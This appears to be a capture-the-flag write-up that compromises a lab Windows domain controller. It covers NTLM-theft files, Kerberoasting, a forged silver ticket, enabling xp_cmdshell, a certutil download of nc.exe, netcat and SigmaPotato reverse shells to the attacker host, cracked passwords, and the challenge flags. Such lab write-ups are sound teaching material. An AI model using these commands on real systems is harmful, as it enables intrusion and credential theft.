
## CTF Writeup: Breach

---
## Reconnaissance

An initial scan revealed the following information about the running services on the target system.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.45.220        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 17:36 -0500
Nmap scan report for 10.129.45.220
Host is up (0.020s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-06 22:39:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-06T22:35:42
|_Not valid after:  2056-08-06T22:35:42
| ms-sql-info: 
|   10.129.45.220:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.45.220:1433: 
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-08-06T22:40:43+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-06T22:40:43+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-06T22:40:04+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-08-05T22:32:57
|_Not valid after:  2027-02-04T22:32:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49918/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-06T22:40:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.67 seconds
```

The target seems to be an Domain Controller. The TCP Scan revealed information about the FQDN of the target BREACHDC.breach.vl, the Hostname BREACHDC & the Domainname itself breach.vl. Let's map all of those attributes to the target ip address in our local dns file.

```
echo "10.129.45.220 breachdc.breach.vl breach.vl breachdc" | tee -a /etc/hosts
```

Let' start with checking if guest and anonymous user access is enabled. Anonymous acces didn't work.

```
nxc smb breach.vl -u '' -p '' --shares
```

But the guest user was activated!

```
nxc smb breach.vl -u 'guest' -p '' --shares
SMB         10.129.45.220   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.45.220   445    BREACHDC         [+] breach.vl\guest: 
SMB         10.129.45.220   445    BREACHDC         [*] Enumerated shares
SMB         10.129.45.220   445    BREACHDC         Share           Permissions     Remark
SMB         10.129.45.220   445    BREACHDC         -----           -----------     ------
SMB         10.129.45.220   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.45.220   445    BREACHDC         C$                              Default share
SMB         10.129.45.220   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.45.220   445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.45.220   445    BREACHDC         share           READ,WRITE      
SMB         10.129.45.220   445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.45.220   445    BREACHDC         Users           READ
```

As we can see from the server response, there seems to be two non-default SMB Shares. In which we both have read permissions and in the "share" even write permissions!

Before checking them out I'd like to further enumerate the instance. I'll enumerate domain users and store the output inside an "newusers.txt" file on my local machine.

```
nxc smb breach.vl -u 'guest' -p '' --rid-brute > newusers.txt
```

Formatted the output and stored the users wordlist inside an users.txt file on my local machine, for password spraying.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed users with there password as there username, but didn't find any hit.

```
nxc smb breach.vl -u users.txt -p users.txt
```

Let's also enumerate LDAP, to check for an potential hidden password inside the description or info tab! Unfortunately we weren't able to enumerate LDAP with guest authentication.

```
ldapsearch -H "ldap://breach.vl" -D guest@breach.vl -w '' -b "dc=breach,dc=vl" "*" > ldapsearch.txt
```

Let's check out the SMB Shares out now. First started with the not so interesting SMB Share. I connected & found an Default and Public Share. Nothing interesting.

```
smbclient \\\\breach.vl/Users -U guest
```

Moving onto the SMB Share in which we have write permissions.

```
smbclient \\\\breach.vl/share -U guest
```

Downloaded all SMB Shares onto my local machine. 

```
smbclient \\\\breach.vl/share -U guest 
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
smb: \>
```

There wasn't a single file. The only real information we got that there is 3 user shares of users we already enumerated.

Since there is an webservice running on port 80 and we have write permissions on the SMB Share I highly think that the SMB Share could actually be the webroot itself & we could maybe get RCE by putting malware into the SMB Share and executing it via browser.
Let's checkout the webservice running on port 80!

```
smbclient \\\\breach.vl/share -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> put test.txt 
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Thu Aug  6 18:02:19 2026
  ..                                DHS        0  Tue Sep  9 05:35:32 2025
  finance                             D        0  Thu Feb 17 05:19:34 2022
  software                            D        0  Thu Feb 17 05:19:12 2022
  test.txt                            A        0  Thu Aug  6 18:02:19 2026
  transfer                            D        0  Mon Sep  8 05:13:44 2025

                7863807 blocks of size 4096. 1559334 blocks available
smb: \> cd transfer\
smb: \transfer\> put test.txt 
putting file test.txt as \transfer\test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \transfer\> ls
  .                                   D        0  Thu Aug  6 18:02:47 2026
  ..                                  D        0  Thu Aug  6 18:02:19 2026
  claire.pope                         D        0  Thu Feb 17 05:21:35 2022
  diana.pope                          D        0  Thu Feb 17 05:21:19 2022
  julia.wong                          D        0  Wed Apr 16 19:38:12 2025
  test.txt                            A        0  Thu Aug  6 18:02:47 2026

                7863807 blocks of size 4096. 1559334 blocks available
smb: \transfer\>
```

I added an .txt file into the default share & in the transfers share, but this didn't seem to work. 

Let's proceed with trying to download domain information using bloodhound.

This failed, because we couldn't connect to LDAP using guest authentication.

```
bloodhound-python -u guest -p '' -ns 10.129.45.220 -d breach.vl -c all
```

Since we have an users list, out of intuition. Let's just test ASREP-Roasting & check if we can get an TGT. But this didn't work out for us.

```
impacket-GetNPUsers -dc-ip 10.129.45.220 breach.vl/ -no-pass -usersfile users.txt
```

Perhaps let's try NTLM Theft I will utilize an tool called ntlm_theft.py which generates malware which harvests the NTLM Hash of the user whenever he executes the file, we'll input in the SMB Share.

```
python3 ntlm_theft.py -g all -s 10.10.15.9 -f hacked
```

Navigated into the directory "hacked" in which all files were stored and connected to the SMB Share.

```
smbclient \\\\breach.vl/share -U guest
```

Started up responder on my local machine, which will capture the NTLM Hash.

```
responder -I tun0
```

I tried adding the files into the root first. But this didn't do anything, after waiting some time I navigated into the "transfers" directory & uploaded all files there.

```
recurse ON
prompt OFF
mput *
```

Intercepted the NTLM Hash of user Julia.Wong successfully!

```
Julia.Wong::BREACH:a8b7b7b02034df88:3FFCE26F495CA7F7AFBC0E3CA7025F0E:0101000000000000807A3A5BCF25DD01FF9AB215ED73015000000000020008004E004D004400480001001E00570049004E002D00480039004B005100530058005000310057004800390004003400570049004E002D00480039004B00510053005800500031005700480039002E004E004D00440048002E004C004F00430041004C00030014004E004D00440048002E004C004F00430041004C00050014004E004D00440048002E004C004F00430041004C0007000800807A3A5BCF25DD0106000400020000000800300030000000000000000100000000200000AA40C3786339AFC1353FCBFFB5EC460E7851EF8DFEDB08D55405B358B6155F680A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0039000000000000000000
```

Bruteforced the NTLM Hash & gained an valid password for user Julia.Wong.

```
john Julia.Wong --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Computer1        (Julia.Wong)     
1g 0:00:00:00 DONE (2026-08-06 18:19) 5.555g/s 682666p/s 682666c/s 682666C/s bratz1234..monforte
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

```
Julia.Wong:Computer1
```

Before continuing enumeration I wanted to check if other users share the same password.
But this didn't seem to be the case.

```
nxc smb breach.vl -u users.txt -p passwords.txt --continue-on-success
```

Enumerated which SMB Share Permissions user Julia.Wong has & she seems to have read access on NETLOGON & SYSVOL. Which is kinda unusual. Could she have higher permissions?

```
nxc smb breach.vl -u Julia.Wong -p passwords.txt --shares                
SMB         10.129.45.220   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.45.220   445    BREACHDC         [+] breach.vl\Julia.Wong:Computer1 
SMB         10.129.45.220   445    BREACHDC         [*] Enumerated shares
SMB         10.129.45.220   445    BREACHDC         Share           Permissions     Remark
SMB         10.129.45.220   445    BREACHDC         -----           -----------     ------
SMB         10.129.45.220   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.45.220   445    BREACHDC         C$                              Default share
SMB         10.129.45.220   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.45.220   445    BREACHDC         NETLOGON        READ            Logon server share 
SMB         10.129.45.220   445    BREACHDC         share           READ,WRITE      
SMB         10.129.45.220   445    BREACHDC         SYSVOL          READ            Logon server share 
SMB         10.129.45.220   445    BREACHDC         Users           READ
```

Spraying winrm wasn't successfull. We can't connect to the target machine.

```
nxc winrm breach.vl -u Julia.Wong -p passwords.txt     
WINRM       10.129.45.220   5985   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) 
WINRM       10.129.45.220   5985   BREACHDC         [-] breach.vl\Julia.Wong:Computer1
```

Spraying MSSQL was authenticated. We could connect to the MSSQL Database.

```
nxc mssql breach.vl -u Julia.Wong -p passwords.txt    
MSSQL       10.129.45.220   1433   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl) (EncryptionReq:False)                                                                                                          
MSSQL       10.129.45.220   1433   BREACHDC         [+] breach.vl\Julia.Wong:Computer1
```

Since RDP is up & running aswell, let's check it out. It seems we are authenticated, but we can't connect to it.

```
nxc rdp breach.vl -u Julia.Wong -p passwords.txt   
RDP         10.129.45.220   3389   BREACHDC         [*] Windows 10 or Windows Server 2016 Build 20348 (name:BREACHDC) (domain:breach.vl) (nla:True)
RDP         10.129.45.220   3389   BREACHDC         [+] breach.vl\Julia.Wong:Computer1
```

Let's check SMB Shares again, especially the shares of the users, in which we previously had no authorization.

```
smbclient \\\\breach.vl/share -U Julia.Wong
```

Retrieved user.txt in C:\share\transfer\julia.wong

```
55d33e52bc5fa7a687b9f0dcfa103dda
```

In the other SMB Shares doesn't seem to be anything useful. Let's proceed with downloading domain information using bloodhound.

```
bloodhound-python -u Julia.Wong -p 'Computer1' -ns 10.129.45.220 -d breach.vl -c all
```

Upon checking out bloodhound. I uploaded all domain information and marked user guest and user Julia.Wong as owned. Julia.Wong seems to be an Admin & part of Tier Zero, but she has no outbound object controls. Let's check the attack surface more with an special BloodHound User Query. But this didn't reveal anything new. 

I enumerated which groups user Julia.Wong is part of & she seems to be part of:

```
STAFF
USERS
PRINT OPERATORS
DOMAIN USERS
```

Print Operators seems very interesting. Let's keep that in mind. I also checked for Kerberoastable Users in BloodHound. The MSSQL Service Account is kerberoastable! Let's get his TGS.

Gained the TGS!

```
impacket-GetUserSPNs -request -dc-ip 10.129.45.220 breach.vl/Julia.Wong                                  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2026-08-06 17:35:38.810875             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$691e9c21e16bdc2cd1c59ce58c30939f$047ae2d3848bc77138d3e50b358616f7bbc5d78e2e31683ce180a27245b9c31d265381686729a4aad9525771112e1774b2853f23574bc58a347dbb0e63d57cd2d90d17797be19a93bd24a75d3134bec4bbe6097ea973970db2ac25a83859903a43af0bae00f620aeaacbe07ed1828329aff072a07002cfdf50af5f863805fbe4c615e90887247c83876639661ccbefd1ca1e9b6781d99a60c0b78b4704c8271a3e8f8bd2963a800b3f0be3b3c33f2ba18eca814c27aeeb45b2a400192ebed949a3124ae2300686f51ebee738436ceec173c4e8dbb97ef3c4800d693475a466bb61002547d7c2e10bb3073743127c32d43348ca81d380d9a23127238d801a4c22291ec34b8f798530746f8955ed9dab9d675a6c012ef139cd4af2b9d038fe357b58667155b7cb37a02d1391a309bfe763af572099781b0287949542cf8629a3453b08a197d4e8fa2296ef462444788bc843dbc3c6875aeeb0e549bf864de6cf9bee0e42c95bef0e22ba7bd6d4112dbd4512ee1a1a70b9df9c3cab249d866478c0bdc144e5e042650fe89ac16418198cff6b2545e562cccafa504b91384322ca2c9316d35437fb8a3ff84ce7bfb5b25796bcab8de18b279c575e93642cd11cfe181a12af8cbacbf8cb6bb27dbeb7771eaafc107520492b57174294f9cc7d29ba21621b91ad35d7a940e24c22b8cbce7c19b367aaa479f900c8be0cfdd6aab11517041f10491268bc4adcd3bc8a017795874b4a75b9b9e91147aac27cbd6a4f2378583f7f3ac83da49f90287713d94789bbbbffd8f0f20a8a57c9f737056658a6cdc24051b474ed70d6ca277a9a4c9a751e83546f0037537bf4f76c4c4034bbee79c5e0b074bdc6c1b8adf44fd7723b3809305b9fda3240edc0692eec1c630b5b4987ecc1bff9de8fc38d9373f0c567213c5e9392863e87c6a73234137876b84f03226cee85a4c08149cc3f8f7def58a22efa94e043155a87ee6d31999e91a1c3ecab14fbd13e38382b458cb31a82cb999cb7aa7dd451cb63e4d57ef3f88d77191d4b9cd742d4fef6733a3189e0f5e803263d9ac2bce34769efdc3303df35a7950c47185a65b199482e54ad2448b9b58a276748af2aa215d34646fa1ac3eb0007c6ab18a6aa0de99cdd726be06b0b9b275a0538ea0193a6891e16b71f3b1d6cae1b2dfac90199e146625b06e5d4d58efb38320558b48af13c7e64b6e009772af94a855de5642ffe57ced68c622da7d33c94b41e3a3f653dfeb2b435fa00f63585320b9552c7b9d3f3ea7e0388da19b48ac342a1d527ce47313701a32228e55eb7c1f7c0477cebb06bdacaa01210bfdd9a135198c65a030dc0e96a91347f12b43a81297f9641fbe570d8b8cb42ccb6750653069fa6159244cdcfec54cf72c12acfbed65fb1e2b76d621a0ddb8d792dafc1e25a9a0232d48dd2b13bef13a9bab8adc458d8bd7f5b3416083a66737e7630c064b0df6e77
```

Stored it inside an svc_mssql file on my local machine and utilized john the ripper to crack the password of the mssql service account.

```
john mssql_svc --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)     
1g 0:00:00:00 DONE (2026-08-06 18:39) 14.28g/s 760685p/s 760685c/s 760685C/s chloelouise..spook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
mssql_svc:Trustno1
```

Sprayed users again to check authentications and password re-use, but didn't find anything interesting for smb.

```
nxc smb breach.vl -u users.txt -p passwords.txt --continue-on-success
```

Done the same for mssql and Julia.Wong & mssql_svc can authenticate to the running MSSQL Database.

```
nxc smb breach.vl -u users.txt -p passwords.txt --continue-on-success
```

Sprayed winrm, but no results again.

```
nxc winrm breach.vl -u users.txt -p passwords.txt --continue-on-success
```

Sprayed RDP & both were authenticated, but no connection possible.

```
nxc winrm breach.vl -u users.txt -p passwords.txt --continue-on-success
```

Decided to check out the MSSQL Database. Gained MSSQL Shell.

```
impacket-mssqlclient breach.vl/svc_mssql:'Trustno1'@breachdc.breach.vl -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)>
```

The nxc scan previously already told us that we aren't an admin account on mssql. But I wanted to verify it. We are not!

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Checked out if xp_cmdshell was active, but it didn't seem so.

```
EXEC xp_cmdshell "whoami";
```

xp_dirtree seemed enabled tho! We can abuse this to activate xp_cmdshell potentially.

```
xp_dirtree
```

This didn't work unfortunately, the current service account is lacking permissions. Let's try & perform an NTLM Theft Attack again using xp_dirtree, to maybe capture an higher privileges NTLM Hash.

Started up my responder on my local machine.

```
responder -I tun0
```

Perform reverse call to my responder.

```
EXEC xp_dirtree '//10.10.15.9/fake_share/', 1, 0;
```

Captured NTLM Hash of the same MSSQL Service Account, which means it's useless. Let's proceed with smth else.

I tried to check for impersonation, linked servers or any logins onto the mssql database, but couldn't find anything.

```
nxc mssql breach.vl -u svc_mssql -u Trustno1 -M enum_impersonate
```

Enumerating the database itself also didn't provide anything interesting. There is only default databases available. 

```
SELECT name FROM sys.databases;
```

There is one more thing which we could perform & an so called Silver Ticket Attack, in which we'll utilize an Service Account to forge an Silver Ticket which impersonates the Domain Administrator Account but only for the MSSQL Service!

Let's do it!

Prerequisites are:

```
1. The NTLM Hash of sql_svc
2. The Domain SID
3. The FQDN of the target machine
4. The SPN of the sql_svc
```

Since we already have the last 3, we only need to get the ntlm hash. Let's utilize the following website to generate the ntlm hash of svc_mssql password "Trustno1". 

```
https://www.browserling.com/tools/ntlm-hash
```

NTLM Hash

```
69596C7AA1E8DAEE17F8E78870E25A5C
```

We retrieved the **Domain SID** from BloodHound, by just simply inspecting one of the users and then copy pasting the Domain SID.

```
S-1-5-21-2330692793-3312915120-706255856
```

We already discovered the FQDN of the target machine in the TCP Scan.

```
breachdc.breach.vl
```

We previously discovered the SPN of the mssql service account when kerberoasting

```
MSSQLSvc
```

Let's now forge our Silver Ticket specifically for the MSSQL Database.

```
impacket-ticketer -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain breach.vl -user-id 500 Administrator -spn MSSQLSVC/breachdc.breach.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Exported the .ccache ticket in our Kerberos Variable.

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Connected to the MSSQL Database using the kerberos ticket & gained Administrator MSSQL Shell.

```
impacket-mssqlclient breachdc.breach.vl -k -no-pass                                 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)>
```

Activated xp_cmdshell.

1. Step: Show advanced options (required)

```
EXEC sp_configure 'show advanced options', '1';
```

```
RECONFIGURE;
```

2. Step: Enable xp_cmdshell

```
EXEC sp_configure 'xp_cmdshell', '1';
```

```
RECONFIGURE;
```

3. Step: Verify it's enabled

```
EXEC sp_configure 'xp_cmdshell';
```

Verified if it's working & yes it does, we gained Command Execution on the Domain Controller.

```
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell "whoami";
output             
----------------   
breach\svc_mssql   
NULL
```

Let's start up an python3 webserver in the directory in which my nc.exe is stored.

```
python3 -m http.server 80
```

Transfered nc.exe onto the target server.

```
EXEC xp_cmdshell "certutil -urlcache -split -f http://10.10.15.9/nc.exe C:\Windows\Tasks\nc.exe";
```

Started up an netcat listener on my local machine on port 443.

```
rlwrap nc -lvnp 443
```

Executed the following command in order to get an reverse connection to my local netcat listener.

```
EXEC xp_cmdshell "C:\Windows\Tasks\nc.exe 10.10.15.9 443 -e cmd.exe";
```

Gained RCE on BREACHDC.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.45.220] 63260
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Privilege Escalation

Enumerating Privileges of our Service Account was very promising. The "SeImpersonatePrivilege" was enabled. Let's abuse it!

```
whoami /all
```

Let's check which OS the Domain Controller is running on in order to check which exploitation path will be the most likely to succeed.

```
systeminfo
Host Name:                 BREACHDC          
OS Name:                   Microsoft Windows Server 2022 Datacenter
```

As we can see Windows Server 2022 is installed. It's very likely that SigmaPotato or SweetPotato will work. Let's try SigmaPotato first.

Transfered it onto BREACHDC.

```
certutil -urlcache -split -f http://10.10.15.9/SigmaPotato.exe SigmaPotato.exe
```

Checked out if command execution works & it does.

```
C:\Temp>SigmaPotato.exe whoami
SigmaPotato.exe whoami
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 916 | Token: 0x744 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1064
[+] Current Command Length: 6 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 688

[+] Process Output:
nt authority\system
```

Started up netcat listener on my local machine on port 53.

```
rlwrap nc -lvnp 53
```

Executed the following command in order to call an reverse connection to our local netcat listener.

```
C:\Temp>SigmaPotato.exe --revshell 10.10.15.9 53
SigmaPotato.exe --revshell 10.10.15.9 53
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 916 | Token: 0x744 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 820
[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 10.10.15.9 | Port: 53
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 6380

[+] Process Output:
```

Gained RCE as user SYSTEM on BREACHDC.

```
rlwrap nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.45.220] 63353

PS C:\Temp>
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
fc98f418f94f8cdb9a30ef026fe64345
```